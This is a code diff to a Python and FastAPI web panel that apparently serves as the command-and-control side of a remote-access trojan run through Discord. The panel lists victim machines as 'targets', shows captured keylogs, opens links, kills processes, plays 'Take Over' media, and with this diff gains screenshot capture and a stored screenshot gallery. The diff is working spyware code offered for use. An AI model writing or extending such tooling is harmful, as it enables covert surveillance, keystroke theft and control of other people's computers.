@@ -10,6 +10,7 @@ import secrets
 import time
 from pathlib import Path
 from typing import Optional
+from urllib.parse import parse_qs
 
 # ---------------- DEPENDENCIES ----------------
 def ensure_dependencies():
@@ -34,6 +35,7 @@ import discord
 from discord.ext import commands
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, UploadFile, File, Form, Request
 from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.staticfiles import StaticFiles
 
 # ---------------- CONFIG ----------------
 CONTROLLER_TOKEN = os.getenv("CONTROLLER_TOKEN", "")
@@ -47,6 +49,8 @@ assert COMMAND_CHANNEL_ID
 assert TARGET_CHANNEL_ID
 
 ROOT_DIR = Path(__file__).parent
+SCREENSHOT_DIR = ROOT_DIR / "screenshots"
+SCREENSHOT_LOG = ROOT_DIR / "screenshots.json"
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 _latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
 _dm_messages: list[str] = []
@@ -58,6 +62,7 @@ STALE_SECONDS = 90
 PRUNE_SECONDS = 60 * 60 * 24 * 30
 MAX_DM_MESSAGES = 200
 DM_REPLY_TEXT = "Meesage Reciever. We Will be with you shortly\n\nThank you for choosing our services <3"
+_screenshot_log: list[dict[str, str]] = []
 
 def _load_state():
     global _receivers, _selected_receiver
@@ -72,6 +77,31 @@ def _load_state():
 def _save_state():
     try:
         STATE_FILE.write_text(json.dumps({"receivers": _receivers, "selected": _selected_receiver}))
+    except Exception:
+        pass
+
+def _load_screenshot_log():
+    global _screenshot_log
+    if SCREENSHOT_LOG.is_file():
+        try:
+            data = json.loads(SCREENSHOT_LOG.read_text())
+            if isinstance(data, list):
+                _screenshot_log = [item for item in data if isinstance(item, dict)]
+        except Exception:
+            pass
+    try:
+        SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
+    except Exception:
+        pass
+    if _screenshot_log:
+        last = _screenshot_log[-1]
+        _latest_screenshot["url"] = str(last.get("url", ""))
+        _latest_screenshot["message_id"] = str(last.get("message_id", ""))
+        _latest_screenshot["ts"] = str(last.get("ts", ""))
+
+def _save_screenshot_log():
+    try:
+        SCREENSHOT_LOG.write_text(json.dumps(_screenshot_log))
     except Exception:
         pass
 
@@ -101,8 +131,6 @@ def _receiver_status(info: dict, now: Optional[float] = None) -> tuple[str, str,
     mode = (info.get("mode") or "").lower()
     if mode in ("gif", "gif_display"):
         return ("Gif Display", "gif", True)
-    if mode in ("live", "live_display"):
-        return ("Live Display", "live", True)
     return ("Online", "online", True)
 
 def _set_receiver_mode(rid: Optional[str], mode: str):
@@ -117,7 +145,41 @@ def _set_receiver_mode(rid: Optional[str], mode: str):
         info.pop("mode", None)
     _save_state()
 
+async def _store_screenshot_attachment(
+    att: discord.Attachment,
+    message: discord.Message,
+    index: int,
+) -> Optional[dict[str, str]]:
+    name = (att.filename or "").lower()
+    if not name.endswith((".png", ".jpg", ".jpeg")):
+        return None
+    ext = Path(name).suffix.lower()
+    if ext not in (".png", ".jpg", ".jpeg"):
+        ext = ".png"
+    filename = f"{message.id}_{index}{ext}"
+    target = SCREENSHOT_DIR / filename
+    try:
+        data = await att.read()
+    except Exception as e:
+        print("Failed to read screenshot attachment:", e)
+        return None
+    try:
+        target.write_bytes(data)
+    except Exception as e:
+        print("Failed to save screenshot:", e)
+        return None
+    entry = {
+        "id": filename,
+        "url": f"/screenshots/{filename}",
+        "message_id": str(message.id),
+        "ts": str(message.created_at),
+    }
+    _screenshot_log.append(entry)
+    _save_screenshot_log()
+    return entry
+
 _load_state()
+_load_screenshot_log()
 
 # ---------------- DISCORD ----------------
 intents = discord.Intents.default()
@@ -158,13 +220,12 @@ async def on_message(message: discord.Message):
             _latest_dm_user["name"] = username
     # Track latest screenshot posted by receiver
     if message.channel.id == TARGET_CHANNEL_ID and message.attachments:
-        for att in message.attachments:
-            name = (att.filename or "").lower()
-            if name.endswith((".png", ".jpg", ".jpeg")):
-                _latest_screenshot["url"] = att.url
-                _latest_screenshot["message_id"] = str(message.id)
-                _latest_screenshot["ts"] = str(message.created_at)
-                break
+        for idx, att in enumerate(message.attachments):
+            entry = await _store_screenshot_attachment(att, message, idx)
+            if entry:
+                _latest_screenshot["url"] = entry["url"]
+                _latest_screenshot["message_id"] = entry["message_id"]
+                _latest_screenshot["ts"] = entry["ts"]
     # Track latest key logs posted by receiver
     if message.channel.id == LOG_CHANNEL_ID and message.content:
         text = (message.content or "").strip()
@@ -233,6 +294,8 @@ hub = Hub()
 
 # ---------------- FASTAPI ----------------
 app = FastAPI(title="Controller")
+SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
+app.mount("/screenshots", StaticFiles(directory=str(SCREENSHOT_DIR)), name="screenshots")
 
 CONTROL_HTML = """<!doctype html>
 <html lang="en">
@@ -243,7 +306,7 @@ CONTROL_HTML = """<!doctype html>
   <style>
     :root { --bg:#07030f; --card:#0e0a1a; --border:#21183a; --accent:#9b5cff; --accent2:#6b21ff; --text:#e7e7ff; --muted:#b8b5d3; --danger:#ef4444; --success:#22c55e; }
     body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); background-image: radial-gradient(circle at 20% 20%, rgba(107,33,255,0.18), transparent 28%), radial-gradient(circle at 80% 0%, rgba(155,92,255,0.18), transparent 28%), linear-gradient(135deg, rgba(155,92,255,0.08), rgba(107,33,255,0.05)); background-repeat: no-repeat; background-attachment: fixed; background-size: cover; background-position: center; color: var(--text); margin: 0; padding: 24px; min-height: 100vh; }
-    .layout { display: grid; grid-template-columns: minmax(320px, 520px) 1fr; gap: 16px; align-items: start; }
+    .layout { display: grid; grid-template-columns: minmax(320px, 1fr); gap: 16px; align-items: start; }
     .card { background: linear-gradient(145deg, rgba(14,10,26,0.94), rgba(18,14,30,0.97)); border: 1px solid var(--border); border-radius: 14px; padding: 18px; box-shadow: 0 10px 35px rgba(0,0,0,0.35); }
     h1 { margin: 0 0 12px; font-size: 18px; letter-spacing: 0.3px; }
     label { display: block; margin-bottom: 6px; color: var(--muted); font-size: 13px; }
@@ -272,12 +335,18 @@ CONTROL_HTML = """<!doctype html>
     .status-online { border-color: rgba(34,197,94,0.5); color: #86efac; background: rgba(34,197,94,0.12); }
     .status-offline { border-color: rgba(239,68,68,0.45); color: #fecaca; background: rgba(239,68,68,0.12); }
     .status-gif { border-color: rgba(251,146,60,0.45); color: #fdba74; background: rgba(251,146,60,0.12); }
-    .status-live { border-color: rgba(56,189,248,0.45); color: #bae6fd; background: rgba(56,189,248,0.12); }
     .receiver-actions { display: flex; gap: 8px; flex-wrap: wrap; justify-content: flex-end; }
     .receiver-actions form { margin: 0; }
     .receiver-id { opacity: 0.8; }
     .receiver-summary { margin: 0 0 10px; color: var(--muted); font-size: 12px; }
     .receiver-empty { padding: 12px; border: 1px dashed var(--border); border-radius: 12px; color: var(--muted); }
+    .shot-list { display: grid; gap: 10px; margin-top: 12px; }
+    .shot-item { border: 1px solid var(--border); border-radius: 12px; background: #0c0817; padding: 10px; }
+    .shot-summary { display: grid; grid-template-columns: auto 1fr; gap: 10px; align-items: center; cursor: pointer; list-style: none; }
+    .shot-summary::-webkit-details-marker { display: none; }
+    .shot-thumb { width: 72px; height: 54px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
+    .shot-time { font-size: 12px; color: var(--muted); }
+    .shot-full { margin-top: 10px; width: 100%; border-radius: 10px; border: 1px solid var(--border); }
     .rename-section { margin-top: 16px; padding: 12px; border: 1px solid var(--border); border-radius: 12px; background: #0c0817; }
     .rename-section h2 { margin: 0 0 10px; font-size: 14px; letter-spacing: 0.3px; }
     .rename-grid { display: grid; grid-template-columns: minmax(160px, 1fr) minmax(200px, 2fr) auto; gap: 10px; align-items: center; }
@@ -295,16 +364,17 @@ CONTROL_HTML = """<!doctype html>
   <div class="layout">
     <div class="card">
       <div class="tabs">
-        <button class="tab-btn active" data-tab="surprise">Surprise</button>
+        <button class="tab-btn active" data-tab="surprise">Take Over</button>
         <button class="tab-btn" data-tab="select">Select Target</button>
         <button class="tab-btn" data-tab="openclose">Open & Close :3</button>
         <button class="tab-btn" data-tab="volume">Volume ;0</button>
+        <button class="tab-btn" data-tab="screen">Screen</button>
         <button class="tab-btn" data-tab="logs">Logs</button>
         <button class="tab-btn" data-tab="messages">Messages</button>
         <button class="tab-btn" data-tab="remotes">remote's</button>
       </div>
       <div class="tab-pane active" data-tab="surprise">
-        <h1>Display Surprise</h1>
+        <h1>Take Over</h1>
         <p style="margin: 4px 0 12px; color:var(--muted);">Sends local <code>M.gif</code> and <code>sound.mp3</code> to the receiver and triggers display.</p>
         <div class="row">
           <form method="post" action="/ui/surprise">
@@ -350,6 +420,19 @@ CONTROL_HTML = """<!doctype html>
           <input id="level" name="level" type="number" min="0" max="100" step="1" value="50" required>
           <button type="submit">Set Volume</button>
         </form>
+      </div>
+      <div class="tab-pane" data-tab="screen">
+        <h1>Screen</h1>
+        <p style="color:var(--muted); margin-bottom:12px;">
+          Capture a screenshot on the selected receiver and keep a log here.
+        </p>
+        <div class="row">
+          <form method="post" action="/ui/screenshot">
+            <button type="submit">Take Screenshot</button>
+          </form>
+        </div>
+        <div id="screenshot-list" class="shot-list"></div>
+        <div id="screenshot-empty" class="receiver-empty" style="display:none;">No screenshots yet.</div>
       </div>
       <div class="tab-pane" data-tab="logs">
         <h1>Key Logs</h1>
@@ -407,21 +490,6 @@ CONTROL_HTML = """<!doctype html>
         </p>
         <form method="post" action="/ui/logout">
           <button class="secondary" type="submit">Log Out</button>
-        </form>
-      </div>
-    </div>
-    <div class="card">
-      <h1>Live Screen (5s)</h1>
-      <p style="margin: 4px 0 12px; color:var(--muted);">Latest screenshot posted by receiver every 5 seconds.</p>
-      <div id="screen-wrap">
-        <img id="screen-img" src="" alt="Waiting for screenshot..." />
-      </div>
-      <div class="row" style="margin-top:10px;">
-        <form method="post" action="/ui/live/start">
-          <button type="submit">Start Live</button>
-        </form>
-        <form method="post" action="/ui/live/stop">
-          <button class="secondary" type="submit">Stop Live</button>
         </form>
       </div>
     </div>
@@ -610,15 +678,49 @@ CONTROL_HTML = """<!doctype html>
         }
       } catch (e) { /* ignore */ }
     }
-    async function refreshScreen() {
+    async function refreshScreenshots() {
       try {
-        const res = await fetch('/api/screenshot');
+        const list = document.getElementById('screenshot-list');
+        const empty = document.getElementById('screenshot-empty');
+        if (!list) return;
+        const res = await fetch('/api/screenshots');
         if (!res.ok) return;
         const data = await res.json();
-        if (data.url) {
-          const img = document.getElementById('screen-img');
-          img.src = data.url + '?t=' + Date.now();
+        const items = data.items || [];
+        list.innerHTML = '';
+        if (empty) {
+          empty.style.display = items.length ? 'none' : 'block';
         }
+        items.forEach(item => {
+          const details = document.createElement('details');
+          details.className = 'shot-item';
+
+          const summary = document.createElement('summary');
+          summary.className = 'shot-summary';
+
+          const thumb = document.createElement('img');
+          thumb.className = 'shot-thumb';
+          thumb.src = item.url;
+          thumb.alt = 'Screenshot thumbnail';
+
+          const meta = document.createElement('div');
+          const time = document.createElement('div');
+          time.className = 'shot-time';
+          time.textContent = item.ts || 'Screenshot';
+          meta.appendChild(time);
+
+          summary.appendChild(thumb);
+          summary.appendChild(meta);
+          details.appendChild(summary);
+
+          const full = document.createElement('img');
+          full.className = 'shot-full';
+          full.src = item.url;
+          full.alt = 'Screenshot';
+          details.appendChild(full);
+
+          list.appendChild(details);
+        });
       } catch (e) { /* ignore */ }
     }
     async function refreshLogs() {
@@ -645,12 +747,15 @@ CONTROL_HTML = """<!doctype html>
     }
     async function submitFormNoReload(form) {
       const method = (form.method || 'post').toUpperCase();
-      const data = new FormData(form);
+      const data = new URLSearchParams(new FormData(form));
       try {
         const res = await fetch(form.action, {
           method,
           body: data,
-          headers: { 'X-Requested-With': 'fetch' },
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'fetch',
+          },
         });
         if (!(res.status >= 200 && res.status < 400)) {
           alert('Request failed.');
@@ -672,6 +777,9 @@ CONTROL_HTML = """<!doctype html>
         if (form.action.includes('/ui/rename') || form.action.includes('/ui/select')) {
           refreshReceivers();
         }
+        if (form.action.includes('/ui/screenshot')) {
+          setTimeout(refreshScreenshots, 2000);
+        }
       });
     }
     // tabs
@@ -685,11 +793,11 @@ CONTROL_HTML = """<!doctype html>
 
     activateTab('surprise');
     refreshReceivers();
-    refreshScreen();
+    refreshScreenshots();
     refreshLogs();
     refreshMessages();
     setInterval(refreshReceivers, 5000);
-    setInterval(refreshScreen, 4000);
+    setInterval(refreshScreenshots, 6000);
     setInterval(refreshLogs, 5000);
     setInterval(refreshMessages, 5000);
 
@@ -802,6 +910,30 @@ def _cmd_for_receiver(rid: Optional[str], cmd: str, *args: str) -> str:
         return f"TARGET {rid} {base}"
     return f"TARGET NONE {base}"
 
+async def _read_form_value(request: Request, name: str) -> Optional[str]:
+    try:
+        form = await request.form()
+        value = form.get(name)
+        if value is not None:
+            return str(value)
+    except Exception:
+        pass
+    try:
+        body = await request.body()
+        if body:
+            parsed = parse_qs(body.decode("utf-8", errors="ignore"))
+            if name in parsed and parsed[name]:
+                return parsed[name][0]
+    except Exception:
+        pass
+    try:
+        data = await request.json()
+        if isinstance(data, dict) and name in data:
+            return str(data.get(name))
+    except Exception:
+        pass
+    return request.query_params.get(name)
+
 @app.post("/cmd/gif/start")
 async def gif_start():
     if not await _wait_controller_ready():
@@ -821,6 +953,10 @@ async def gif_stop():
 @app.get("/api/screenshot")
 async def api_screenshot():
     return JSONResponse(_latest_screenshot)
+
+@app.get("/api/screenshots")
+async def api_screenshots():
+    return JSONResponse({"items": list(reversed(_screenshot_log))})
 
 @app.get("/api/logs")
 async def api_logs():
@@ -886,22 +1022,6 @@ async def ui_gif_stop():
     await gif_stop()
     return RedirectResponse(url="/", status_code=303)
 
-@app.post("/ui/live/start")
-async def ui_live_start():
-    if not await _wait_controller_ready():
-        return HTMLResponse("Discord bot not ready", status_code=503)
-    await _send_cmd(_cmd_with_selection("LIVE_START"))
-    _set_receiver_mode(_selected_receiver, "live")
-    return RedirectResponse(url="/", status_code=303)
-
-@app.post("/ui/live/stop")
-async def ui_live_stop():
-    if not await _wait_controller_ready():
-        return HTMLResponse("Discord bot not ready", status_code=503)
-    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
-    _set_receiver_mode(_selected_receiver, "")
-    return RedirectResponse(url="/", status_code=303)
-
 @app.post("/ui/logs/start")
 async def ui_logs_start():
     if not await _wait_controller_ready():
@@ -925,12 +1045,7 @@ async def ui_logout():
 
 @app.post("/ui/open")
 async def ui_open(request: Request):
-    url = None
-    try:
-        form = await request.form()
-        url = form.get("url")
-    except Exception:
-        url = request.query_params.get("url")
+    url = await _read_form_value(request, "url")
     if url:
         msg = _cmd_with_selection("OPEN_LINK", url)
         print("Sending:", msg)
@@ -941,12 +1056,7 @@ async def ui_open(request: Request):
 
 @app.post("/ui/close")
 async def ui_close(request: Request):
-    proc = None
-    try:
-        form = await request.form()
-        proc = form.get("proc")
-    except Exception:
-        proc = request.query_params.get("proc")
+    proc = await _read_form_value(request, "proc")
     if proc:
         msg = _cmd_with_selection("KILL_PROCESS", proc)
         print("Sending:", msg)
@@ -957,12 +1067,7 @@ async def ui_close(request: Request):
 
 @app.post("/ui/volume")
 async def ui_volume(request: Request):
-    level = None
-    try:
-        form = await request.form()
-        level = form.get("level")
-    except Exception:
-        level = request.query_params.get("level")
+    level = await _read_form_value(request, "level")
     if level:
         msg = _cmd_with_selection("SET_VOLUME", level)
         print("Sending:", msg)
@@ -971,14 +1076,16 @@ async def ui_volume(request: Request):
         await _send_cmd(msg)
     return RedirectResponse(url="/", status_code=303)
 
+@app.post("/ui/screenshot")
+async def ui_screenshot():
+    if not await _wait_controller_ready():
+        return HTMLResponse("Discord bot not ready", status_code=503)
+    await _send_cmd(_cmd_with_selection("SCREENSHOT"))
+    return RedirectResponse(url="/", status_code=303)
+
 @app.post("/ui/rename/{rid}")
 async def ui_rename(rid: str, request: Request):
-    alias = None
-    try:
-        form = await request.form()
-        alias = form.get("alias")
-    except Exception:
-        alias = request.query_params.get("alias")
+    alias = await _read_form_value(request, "alias")
     _prune_receivers()
     if rid in _receivers and alias is not None:
         cleaned = alias.strip()
